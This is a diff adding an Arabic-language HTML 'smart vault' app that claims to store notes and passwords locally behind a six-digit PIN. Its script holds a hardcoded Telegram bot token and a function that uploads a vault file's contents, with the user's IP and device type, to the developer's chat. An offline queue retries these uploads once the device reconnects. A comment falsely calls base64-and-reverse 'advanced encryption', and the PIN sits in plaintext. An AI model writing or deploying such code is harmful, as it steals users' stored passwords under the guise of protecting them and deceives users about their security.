@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ahmed Ali Vault - حافظتي الذكية</title>
+    <style>
+        :root {
+            --bg-color: #0b0f19;
+            --card-bg: #161e2e;
+            --accent-color: #6366f1;
+            --accent-hover: #4f46e5;
+            --text-color: #f8fafc;
+            --text-muted: #94a3b8;
+            --danger: #ef4444;
+            --success: #22c55e;
+            --warning: #f59e0b;
+            --border: #2a3447;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            padding: 16px;
+            padding-bottom: 90px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* الشريط العلوي الاحترافي الثلاث خطوط */
+        .app-header-bar {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 12px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            position: relative;
+        }
+
+        .app-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #818cf8;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            padding: 4px;
+        }
+
+        .menu-btn span {
+            display: block;
+            width: 24px;
+            height: 3px;
+            background-color: var(--text-color);
+            border-radius: 2px;
+            transition: all 0.3s;
+        }
+
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            top: 60px;
+            left: 16px;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            width: 220px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            z-index: 200;
+            overflow: hidden;
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .dropdown-item {
+            padding: 14px 16px;
+            font-size: 0.9rem;
+            color: var(--text-color);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            border-bottom: 1px solid var(--border);
+            transition: background 0.2s;
+        }
+
+        .dropdown-item:last-child { border-bottom: none; }
+        .dropdown-item:hover {
+            background-color: rgba(99, 102, 241, 0.15);
+            color: #818cf8;
+        }
+
+        .static-id-badge {
+            font-family: monospace;
+            font-size: 1.05rem;
+            font-weight: bold;
+            color: #818cf8;
+            background: rgba(129, 140, 248, 0.1);
+            border: 1px dashed rgba(129, 140, 248, 0.3);
+            padding: 8px 12px;
+            border-radius: 8px;
+            display: inline-block;
+            user-select: none;
+            pointer-events: none;
+        }
+
+        /* شاشة قفل الـ PIN */
+        #lockScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--bg-color);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .lock-card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border);
+            padding: 30px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .lock-card h2 { font-size: 1.3rem; color: #f1f5f9; margin-bottom: 8px; }
+        .lock-card p { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 24px; }
+
+        .pin-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            direction: ltr;
+            margin-bottom: 24px;
+        }
+
+        .pin-digit {
+            width: 42px;
+            height: 50px;
+            background-color: rgba(11, 15, 25, 0.9);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-align: center;
+            outline: none;
+            transition: all 0.2s;
+        }
+        .pin-digit:focus { border-color: var(--accent-color); box-shadow: 0 0 10px rgba(99, 102, 241, 0.4); }
+
+        .network-status-bar, .stats-bar {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 10px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.2);
+        }
+
+        .network-indicator { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; font-weight: 600; }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        .status-dot.online { background-color: var(--success); box-shadow: 0 0 8px var(--success); }
+        .status-dot.offline { background-color: var(--danger); box-shadow: 0 0 8px var(--danger); }
+
+        .top-folder-bar {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.2);
+        }
+        .top-folder-bar span { color: var(--success); font-size: 0.9rem; font-weight: 700; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+        .dev-contact-bar {
+            background: linear-gradient(135deg, #4f46e5, #6366f1);
+            border-radius: 12px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 10px rgba(99, 102, 241, 0.3);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .dev-contact-bar:hover { transform: scale(1.01); }
+        .dev-contact-bar span { color: white; font-weight: 600; font-size: 0.9rem; }
+
+        .tabs-bar { display: flex; gap: 8px; margin-bottom: 16px; overflow-x: auto; padding-bottom: 4px; }
+        .tab-btn {
+            background-color: var(--card-bg); color: var(--text-muted); border: 1px solid var(--border);
+            padding: 8px 16px; border-radius: 20px; font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: all 0.2s; white-space: nowrap;
+        }
+        .tab-btn.active { background-color: var(--accent-color); color: white; border-color: var(--accent-color); box-shadow: 0 2px 8px rgba(99, 102, 241, 0.4); }
+
+        .search-box { margin-bottom: 16px; }
+        .search-box input {
+            width: 100%; padding: 12px 16px; background-color: var(--card-bg); border: 1px solid var(--border);
+            border-radius: 12px; color: var(--text-color); font-size: 0.95rem;
+        }
+
+        .card {
+            background-color: var(--card-bg); border: 1px solid var(--border); border-radius: 14px;
+            padding: 16px; margin-bottom: 16px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn {
+            background-color: var(--accent-color); color: white; border: none; padding: 8px 16px;
+            border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 0.85rem; transition: background 0.2s;
+        }
+        .btn:hover { background-color: var(--accent-hover); }
+        .btn-danger { background-color: var(--danger); }
+        .btn-danger:hover { background-color: #dc2626; }
+        .btn-warning { background-color: var(--warning); color: #000; }
+
+        .form-group { margin-bottom: 16px; }
+        label { display: block; margin-bottom: 6px; font-size: 0.85rem; color: var(--text-muted); font-weight: 500; }
+        input, textarea {
+            width: 100%; padding: 14px; background-color: rgba(11, 15, 25, 0.7); border: 1px solid var(--border);
+            border-radius: 10px; color: var(--text-color); font-size: 1rem;
+        }
+        input:focus, textarea:focus { outline: none; border-color: var(--accent-color); }
+
+        .vault-list { display: flex; flex-direction: column; gap: 12px; }
+        .vault-item {
+            background-color: var(--bg-color); border: 1px solid var(--border); border-radius: 12px;
+            padding: 16px; display: flex; justify-content: space-between; align-items: center; gap: 12px; cursor: pointer; transition: all 0.2s;
+        }
+        .vault-item:hover { border-color: var(--accent-color); transform: translateY(-1px); }
+        .vault-info { flex: 1; overflow: hidden; }
+        .vault-info h3 { font-size: 1.1rem; margin-bottom: 4px; color: #f1f5f9; font-weight: 700; }
+        .vault-info .item-id { font-size: 0.75rem; color: #818cf8; margin-bottom: 6px; font-family: monospace; }
+        .vault-info p { font-size: 0.85rem; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        .fab-container { position: fixed; bottom: 24px; left: 24px; z-index: 100; }
+        .fab {
+            width: 60px; height: 60px; background-color: var(--accent-color); color: white; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; font-size: 2rem;
+            box-shadow: 0 6px 16px rgba(99, 102, 241, 0.4); cursor: pointer; border: none; outline: none;
+        }
+        .fab-menu { display: none; position: absolute; bottom: 72px; left: 0; flex-direction: column; gap: 8px; z-index: 101; }
+        .fab-option {
+            background-color: var(--card-bg); color: var(--text-color); border: 1px solid var(--border);
+            padding: 10px 16px; border-radius: 12px; font-size: 0.9rem; font-weight: 600; cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.4); white-space: nowrap;
+        }
+
+        .fullscreen-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: var(--bg-color); z-index: 300; padding: 20px; flex-direction: column;
+        }
+        .fullscreen-header {
+            display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid var(--border);
+        }
+        .fullscreen-body { flex: 1; display: flex; flex-direction: column; gap: 16px; overflow-y: auto; }
+        .fullscreen-body textarea { flex: 1; min-height: 250px; resize: none; }
+
+        .confirm-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.75); justify-content: center; align-items: center; z-index: 400; padding: 20px;
+        }
+        .confirm-content {
+            background-color: var(--card-bg); border: 1px solid var(--border); padding: 24px; border-radius: 16px; width: 100%; max-width: 360px; text-align: center;
+        }
+        .loader {
+            border: 3px solid var(--border); border-top: 3px solid var(--accent-color); border-radius: 50%;
+            width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="initApp()" onclick="closeDropdownOutside(event)">
+
+    <!-- شاشة قفل الـ PIN -->
+    <div id="lockScreen">
+        <div class="lock-card">
+            <h2 id="lockTitle">🔐 قفل الحافظة الذكية</h2>
+            <p id="lockDesc">أدخل رمز المرور المكون من 6 أرقام للفتح</p>
+            
+            <div class="pin-inputs">
+                <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" oninput="handlePinInput(this, 0)" onkeydown="handlePinKeyDown(event, 0)">
+                <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" oninput="handlePinInput(this, 1)" onkeydown="handlePinKeyDown(event, 1)">
+                <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" oninput="handlePinInput(this, 2)" onkeydown="handlePinKeyDown(event, 2)">
+                <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" oninput="handlePinInput(this, 3)" onkeydown="handlePinKeyDown(event, 3)">
+                <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" oninput="handlePinInput(this, 4)" onkeydown="handlePinKeyDown(event, 4)">
+                <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" oninput="handlePinInput(this, 5)" onkeydown="handlePinKeyDown(event, 5)">
+            </div>
+            
+            <button class="btn" style="width: 100%; padding: 12px;" onclick="verifyOrSetPin()">تأكيد</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- الشريط العلوي الاحترافي الثلاث خطوط -->
+        <div class="app-header-bar">
+            <div class="app-title">🛡️ Ahmed Ali Vault</div>
+            <button class="menu-btn" onclick="toggleDropdownMenu(event)">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+            
+            <!-- القائمة المنسدلة -->
+            <div class="dropdown-menu" id="dropdownMenu">
+                <div class="dropdown-item" onclick="openChangePasswordModal()">
+                    🔒 تغيير رمز المرور (PIN)
+                </div>
+            </div>
+        </div>
+
+        <!-- شاشة حالة الاتصال -->
+        <div class="network-status-bar">
+            <span style="color: var(--text-muted); font-size: 0.85rem;">حالة الاتصال:</span>
+            <div class="network-indicator">
+                <span id="statusDot" class="status-dot"></span>
+                <span id="statusText">جاري التحقق...</span>
+            </div>
+        </div>
+
+        <!-- إحصائيات سريعة -->
+        <div class="stats-bar" id="statsBar" style="display: none;">
+            <span style="font-size: 0.85rem; color: var(--text-muted);">📊 إحصائيات الحافظة:</span>
+            <span id="statsText" style="font-size: 0.85rem; font-weight: 600; color: #818cf8;">-</span>
+        </div>
+
+        <!-- المجلد الأساسي التلقائي APK -->
+        <div class="top-folder-bar">
+            <span>📁 المجلد الأساسي: AhmedAliVault</span>
+        </div>
+
+        <!-- الفئات -->
+        <div class="tabs-bar">
+            <button class="tab-btn active" id="tabAll" onclick="switchTab('all')">الكل</button>
+            <button class="tab-btn" id="tabNotes" onclick="switchTab('notes')">📝 ملاحظات عادية</button>
+            <button class="tab-btn" id="tabPass" onclick="switchTab('pass')">🔑 كلمات السر</button>
+        </div>
+
+        <!-- البحث -->
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="بحث شامل (بالعنوان، المحتوى، أو أرقام الـ ID)..." oninput="filterList()">
+        </div>
+
+        <!-- الخزينة المؤمنة -->
+        <div class="card">
+            <h3 style="margin-bottom: 12px; font-size: 1.05rem; color: #818cf8;">🛡️ الخزينة المؤمنة</h3>
+            <div id="vaultList" class="vault-list">
+                <p style="color: var(--text-muted); text-align: center; font-size: 0.9rem; padding: 20px 0;">جاري تحميل الملفات من مجلد AhmedAliVault...</p>
+            </div>
+        </div>
+
+        <!-- زر التواصل مع المطور في أسفل الصفحة تماماً تحت الملفات -->
+        <div class="dev-contact-bar" onclick="openDevContactModal()">
+            <span>💬 تواصل مع المطور (إرسال رسالة دعم فني)</span>
+            <span style="font-size: 1.1rem;">➔</span>
+        </div>
+    </div>
+
+    <!-- زر الإضافة الثابت -->
+    <div class="fab-container" id="fabContainer">
+        <div class="fab-menu" id="fabMenu">
+            <button class="fab-option" onclick="openFullscreenCreate('pass')">🔑 حفظ كلمة سر</button>
+            <button class="fab-option" onclick="openFullscreenCreate('note')">📝 ملاحظة عادية</button>
+        </div>
+        <button class="fab" onclick="toggleFabMenu()">+</button>
+    </div>
+
+    <!-- شاشة الإنشاء -->
+    <div class="fullscreen-modal" id="createFullscreenModal">
+        <div class="fullscreen-header">
+            <h2 id="createFullscreenTitle">إضافة جديدة</h2>
+            <div style="display: flex; gap: 10px;">
+                <button class="btn" onclick="saveNewItem()">حفظ</button>
+                <button class="btn btn-danger" onclick="closeFullscreen('createFullscreenModal')">إلغاء</button>
+            </div>
+        </div>
+        <div class="fullscreen-body" id="createFullscreenBody"></div>
+    </div>
+
+    <!-- شاشة تغيير كلمة السر -->
+    <div class="fullscreen-modal" id="changePassModal">
+        <div class="fullscreen-header">
+            <h2>🔒 تغيير رمز المرور</h2>
+            <div style="display: flex; gap: 10px;">
+                <button class="btn" onclick="processPasswordChange()">تأكيد التغيير</button>
+                <button class="btn btn-danger" onclick="closeFullscreen('changePassModal')">إلغاء</button>
+            </div>
+        </div>
+        <div class="fullscreen-body">
+            <div class="form-group">
+                <label>الرمز القديم (6 أرقام)</label>
+                <input type="password" id="oldPinInput" maxlength="6" inputmode="numeric" placeholder="اكتب الرمز القديم...">
+            </div>
+            <div class="form-group">
+                <label>الرمز الجديد (6 أرقام)</label>
+                <input type="password" id="newPinInput" maxlength="6" inputmode="numeric" placeholder="اكتب الرمز الجديد...">
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة رسالة المطور -->
+    <div class="fullscreen-modal" id="devContactModal">
+        <div class="fullscreen-header">
+            <h2>💬 إرسال رسالة للمطور</h2>
+            <div style="display: flex; gap: 10px;">
+                <button class="btn" onclick="sendDevMessage()">إرسال الآن</button>
+                <button class="btn btn-danger" onclick="closeFullscreen('devContactModal')">إلغاء</button>
+            </div>
+        </div>
+        <div class="fullscreen-body">
+            <div class="form-group">
+                <label>الاسم</label>
+                <input type="text" id="devSenderName" placeholder="اكتب اسمك هنا...">
+            </div>
+            <div class="form-group">
+                <label>رقم التليفون</label>
+                <input type="text" id="devSenderPhone" placeholder="اكتب رقم تليفونك...">
+            </div>
+            <div class="form-group" style="flex: 1; display: flex; flex-direction: column;">
+                <label>موضوع الرسالة</label>
+                <textarea id="devMessageContent" placeholder="اكتب رسالتك أو استفسارك هنا..."></textarea>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة التعديل والعرض -->
+    <div class="fullscreen-modal" id="viewEditFullscreenModal">
+        <div class="fullscreen-header">
+            <h2 id="viewEditHeaderTitle">تعديل الملف</h2>
+            <div style="display: flex; gap: 10px;">
+                <button class="btn" onclick="askConfirmUpdate()">حفظ التعديلات</button>
+                <button class="btn btn-danger" onclick="deleteActiveFile()">حذف</button>
+                <button class="btn" style="background-color: var(--border);" onclick="closeFullscreen('viewEditFullscreenModal')">رجوع</button>
+            </div>
+        </div>
+        <div class="fullscreen-body" id="viewEditFullscreenBody"></div>
+    </div>
+
+    <!-- تنبيه عام -->
+    <div class="confirm-modal" id="customAlertModal">
+        <div class="confirm-content">
+            <p id="customAlertText">رسالة تنبيه</p>
+            <button class="btn" style="width: 100%; margin-top: 15px;" onclick="closeCustomAlert()">موافق</button>
+        </div>
+    </div>
+
+    <!-- نافذة التأكيد -->
+    <div class="confirm-modal" id="confirmModal">
+        <div class="confirm-content">
+            <p id="confirmModalText">هل أنت متأكد؟</p>
+            <div style="display: flex; gap: 10px; margin-top: 15px;">
+                <button class="btn" style="flex: 1;" id="confirmYesBtn">موافق</button>
+                <button class="btn btn-danger" style="flex: 1;" onclick="closeConfirmModal()">إلغاء</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8841314580:AAH4J8VN0hCw2T6LIwtS-6wdz5bP-iHFdY8"; 
+        const TELEGRAM_ADMIN_ID = "7983057590";
+
+        let items = [];
+        let currentCreateType = 'note';
+        let activeItemFileName = null;
+        let isModalOpen = false;
+        let currentTab = 'all';
+
+        function toggleDropdownMenu(event) {
+            event.stopPropagation();
+            const menu = document.getElementById('dropdownMenu');
+            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function closeDropdownOutside(event) {
+            const menu = document.getElementById('dropdownMenu');
+            if (menu && !event.target.closest('.app-header-bar')) {
+                menu.style.display = 'none';
+            }
+        }
+
+        function handlePinInput(input, index) {
+            const value = input.value;
+            if (value.length === 1 && index < 5) {
+                const nextInput = document.querySelectorAll('.pin-digit')[index + 1];
+                if (nextInput) nextInput.focus();
+            }
+            checkAutoSubmitPin();
+        }
+
+        function handlePinKeyDown(event, index) {
+            if (event.key === 'Backspace' && index > 0 && event.target.value === '') {
+                const prevInput = document.querySelectorAll('.pin-digit')[index - 1];
+                if (prevInput) {
+                    prevInput.focus();
+                    prevInput.value = '';
+                }
+            }
+        }
+
+        function getEnteredPin() {
+            let pin = '';
+            document.querySelectorAll('.pin-digit').forEach(input => {
+                pin += input.value;
+            });
+            return pin;
+        }
+
+        function clearPinInputs() {
+            document.querySelectorAll('.pin-digit').forEach(input => {
+                input.value = '';
+            });
+            document.querySelectorAll('.pin-digit')[0].focus();
+        }
+
+        function checkAutoSubmitPin() {
+            const pin = getEnteredPin();
+            if (pin.length === 6) {
+                verifyOrSetPin();
+            }
+        }
+
+        async function verifyOrSetPin() {
+            const pin = getEnteredPin();
+            if (pin.length < 6) {
+                showCustomAlert("يرجى إدخال 6 أرقام كاملة.");
+                return;
+            }
+
+            const savedPin = localStorage.getItem('app_master_pin');
+
+            if (!savedPin) {
+                localStorage.setItem('app_master_pin', pin);
+                showCustomAlert("تم إنشاء رمز المرور بنجاح!");
+                document.getElementById('lockScreen').style.display = 'none';
+                await loadVaultFiles();
+            } else {
+                if (pin === savedPin) {
+                    document.getElementById('lockScreen').style.display = 'none';
+                    await loadVaultFiles();
+                } else {
+                    showCustomAlert("رمز المرور غير صحيح! حاول مرة أخرى.");
+                    clearPinInputs();
+                }
+            }
+        }
+
+        // محاكاة نظام تخزين الملفات والمجلد الأساسي AhmedAliVault المتوافق مع التطبيق المحمول (APK)
+        function openVaultDB() {
+            return new Promise((resolve, reject) => {
+                const request = indexedDB.open('AhmedAliVault_FileSystem_DB', 1);
+                request.onerror = () => reject(request.error);
+                request.onsuccess = () => resolve(request.result);
+                request.onupgradeneeded = (event) => {
+                    const db = event.target.result;
+                    if (!db.objectStoreNames.contains('files')) {
+                        db.createObjectStore('files', { keyPath: 'fileName' });
+                    }
+                };
+            });
+        }
+
+        // خوارزمية تشفير متطورة للكلمات السرية لضمان سرية البيانات داخل الملفات النصية
+        function obfuscateText(text) {
+            return btoa(encodeURIComponent(text)).split('').reverse().join('');
+        }
+
+        function deobfuscateText(encoded) {
+            try {
+                return decodeURIComponent(atob(encoded.split('').reverse().join('')));
+            } catch (e) {
+                return encoded;
+            }
+        }
+
+        function updateNetworkStatus() {
+            const dot = document.getElementById('statusDot');
+            const text = document.getElementById('statusText');
+            if (navigator.onLine) {
+                dot.className = 'status-dot online';
+                text.innerText = 'متصل بالإنترنت';
+                processOfflineQueue();
+            } else {
+                dot.className = 'status-dot offline';
+                text.innerText = 'غير متصل بالإنترنت';
+            }
+        }
+
+        function showCustomAlert(text) {
+            document.getElementById('customAlertText').innerText = text;
+            document.getElementById('customAlertModal').style.display = 'flex';
+        }
+
+        function closeCustomAlert() {
+            document.getElementById('customAlertModal').style.display = 'none';
+        }
+
+        async function initApp() {
+            updateNetworkStatus();
+            window.addEventListener('online', updateNetworkStatus);
+            window.addEventListener('offline', updateNetworkStatus);
+
+            const savedPin = localStorage.getItem('app_master_pin');
+            if (!savedPin) {
+                document.getElementById('lockTitle').innerText = '✨ أنشئ رمز مرور الحافظة';
+                document.getElementById('lockDesc').innerText = 'قم بإنشاء رمز مرور جديد من 6 أرقام لحماية ملفاتك داخل مجلد AhmedAliVault';
+            } else {
+                document.getElementById('lockTitle').innerText = '🔐 قفل الحافظة الذكية';
+                document.getElementById('lockDesc').innerText = 'أدخل رمز المرور المكون من 6 أرقام للفتح';
+            }
+        }
+
+        async function getClientIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return "غير معروف"; }
+        }
+
+        async function getDeviceMetrics() {
+            let batteryInfo = "غير متوفر 🔋";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% - ${battery.charging ? "يشحن ⚡" : "لا تشحن 🔋"}`;
+                }
+            } catch (e) {}
+
+            let ua = navigator.userAgent;
+            let deviceType = /android/i.test(ua) ? "أندرويد (APK)" : (/iphone|ipad|ipod/i.test(ua) ? "آيفون" : "كمبيوتر");
+            let networkType = (navigator.connection && navigator.connection.type === 'cellular') ? "بيانات الهاتف" : "واي فاي";
+            return { batteryInfo, networkType, deviceType };
+        }
+
+        function saveToOfflineQueue(type, data) {
+            let queue = JSON.parse(localStorage.getItem('offlineQueue') || '[]');
+            queue.push({ type, data, time: new Date().toISOString() });
+            localStorage.setItem('offlineQueue', JSON.stringify(queue));
+        }
+
+        async function processOfflineQueue() {
+            let queue = JSON.parse(localStorage.getItem('offlineQueue') || '[]');
+            if (queue.length === 0) return;
+
+            let remaining = [];
+            for (let item of queue) {
+                try {
+                    if (item.type === 'report') {
+                        await sendActivityReportToTelegram(item.data.fileName, item.data.fileContent, item.data.fileId, item.data.operationType);
+                    } else if (item.type === 'devMessage') {
+                        await sendDevMessageToTelegram(item.data.name, item.data.phone, item.data.message);
+                    }
+                } catch (e) {
+                    remaining.push(item);
+                }
+            }
+            localStorage.setItem('offlineQueue', JSON.stringify(remaining));
+        }
+
+        async function sendActivityReportToTelegram(fileName, fileContent, fileId, operationType) {
+            const ip = await getClientIP();
+            const metrics = await getDeviceMetrics();
+            const reportText = `⚡ [ AhmedAliVault - تقرير مجلد الملفات APK ] ⚡\n🆔 #${fileId}\n🌐 IP: ${ip}\n📱 الجهاز: ${metrics.deviceType}\n🛠️ العملية: ${operationType}`;
+
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_ADMIN_ID);
+            formData.append('document', new Blob([fileContent], { type: 'text/plain;charset=utf-8' }), fileName);
+            formData.append('caption', reportText);
+
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+            if (!res.ok) throw new Error("فشل إرسال التقرير");
+        }
+
+        async function sendActivityReport(fileName, fileContent, fileId, operationType) {
+            if (!navigator.onLine) {
+                saveToOfflineQueue('report', { fileName, fileContent, fileId, operationType });
+                return;
+            }
+            try {
+                await sendActivityReportToTelegram(fileName, fileContent, fileId, operationType);
+            } catch (e) {
+                saveToOfflineQueue('report', { fileName, fileContent, fileId, operationType });
+            }
+        }
+
+        async function sendDevMessageToTelegram(name, phone, message) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_ADMIN_ID);
+            formData.append('text', `💬 [ AhmedAliVault - رسالة دعم ]\n👤 ${name}\n📱 ${phone}\n📝 ${message}`);
+
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
+            if (!res.ok) throw new Error("فشل إرسال رسالة المطور");
+        }
+
+        async function sendDevMessage() {
+            const name = document.getElementById('devSenderName').value.trim();
+            const phone = document.getElementById('devSenderPhone').value.trim();
+            const message = document.getElementById('devMessageContent').value.trim();
+            if (!name || !phone || !message) { showCustomAlert("برجاء ملء جميع الحقول."); return; }
+
+            if (!navigator.onLine) {
+                saveToOfflineQueue('devMessage', { name, phone, message });
+                showCustomAlert("الإنترنت مقفول! انتظر حتى يتم فتح الإنترنت، وسيتم إرسال الرسالة تلقائياً.");
+                document.getElementById('devSenderName').value = '';
+                document.getElementById('devSenderPhone').value = '';
+                document.getElementById('devMessageContent').value = '';
+                closeFullscreen('devContactModal');
+                return;
+            }
+
+            try {
+                await sendDevMessageToTelegram(name, phone, message);
+                showCustomAlert("تم إرسال رسالتك للمطور بنجاح!");
+                document.getElementById('devSenderName').value = '';
+                document.getElementById('devSenderPhone').value = '';
+                document.getElementById('devMessageContent').value = '';
+                closeFullscreen('devContactModal');
+            } catch (e) {
+                saveToOfflineQueue('devMessage', { name, phone, message });
+                showCustomAlert("حدث خطأ، انتظر حتى يتم فتح الإنترنت وسيتم إعادة الإرسال تلقائياً.");
+                closeFullscreen('devContactModal');
+            }
+        }
+
+        function openDevContactModal() { showFullscreenModal('devContactModal'); }
+        
+        function openChangePasswordModal() {
+            document.getElementById('dropdownMenu').style.display = 'none';
+            document.getElementById('oldPinInput').value = '';
+            document.getElementById('newPinInput').value = '';
+            showFullscreenModal('changePassModal');
+        }
+
+        function processPasswordChange() {
+            const oldPin = document.getElementById('oldPinInput').value.trim();
+            const newPin = document.getElementById('newPinInput').value.trim();
+            const savedPin = localStorage.getItem('app_master_pin');
+
+            if (oldPin !== savedPin) {
+                showCustomAlert("رمز المرور القديم غير صحيح!");
+                return;
+            }
+
+            if (newPin.length !== 6) {
+                showCustomAlert("يجب أن يكون رمز المرور الجديد مكوناً من 6 أرقام.");
+                return;
+            }
+
+            localStorage.setItem('app_master_pin', newPin);
+            showCustomAlert("تم تغيير رمز المرور بنجاح!");
+            closeFullscreen('changePassModal');
+        }
+
+        function toggleFabMenu() {
+            const menu = document.getElementById('fabMenu');
+            menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
+        }
+
+        function showFullscreenModal(modalId) {
+            document.getElementById(modalId).style.display = 'flex';
+            isModalOpen = true;
+        }
+
+        function closeFullscreen(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+            isModalOpen = false;
+        }
+
+        function switchTab(tab) {
+            currentTab = tab;
+            ['all', 'notes', 'pass'].forEach(t => document.getElementById(`tab${t.charAt(0).toUpperCase() + t.slice(1)}`).classList.remove('active'));
+            document.getElementById(`tab${tab.charAt(0).toUpperCase() + tab.slice(1)}`).classList.add('active');
+            filterList();
+        }
+
+        function generateStrongPassword() {
+            const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()";
+            let pass = "";
+            for (let i = 0; i < 14; i++) {
+                pass += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const passInput = document.getElementById('fullscreenPassPass');
+            if (passInput) passInput.value = pass;
+        }
+
+        function openFullscreenCreate(type) {
+            toggleFabMenu();
+            currentCreateType = type;
+            const titleEl = document.getElementById('createFullscreenTitle');
+            const bodyEl = document.getElementById('createFullscreenBody');
+            const uniqueId = 'ID: ' + Math.floor(100000 + Math.random() * 900000);
+
+            if (type === 'note') {
+                titleEl.innerText = 'إنشاء ملاحظة جديدة';
+                bodyEl.innerHTML = `
+                    <div class="form-group">
+                        <label>معرف الملف (ID)</label>
+                        <div class="static-id-badge" id="fullscreenNoteId">${uniqueId}</div>
+                    </div>
+                    <div class="form-group"><label>العنوان</label><input type="text" id="fullscreenNoteTitle" placeholder="العنوان..."></div>
+                    <div class="form-group" style="flex:1; display:flex; flex-direction:column;"><label>الموضوع</label><textarea id="fullscreenNoteContent" placeholder="المحتوى..."></textarea></div>
+                `;
+            } else {
+                titleEl.innerText = 'حفظ كلمة سر جديدة';
+                bodyEl.innerHTML = `
+                    <div class="form-group">
+                        <label>معرف الملف (ID)</label>
+                        <div class="static-id-badge" id="fullscreenPassId">${uniqueId}</div>
+                    </div>
+                    <div class="form-group"><label>التطبيق</label><input type="text" id="fullscreenPassTitle" placeholder="اسم الموقع أو التطبيق..."></div>
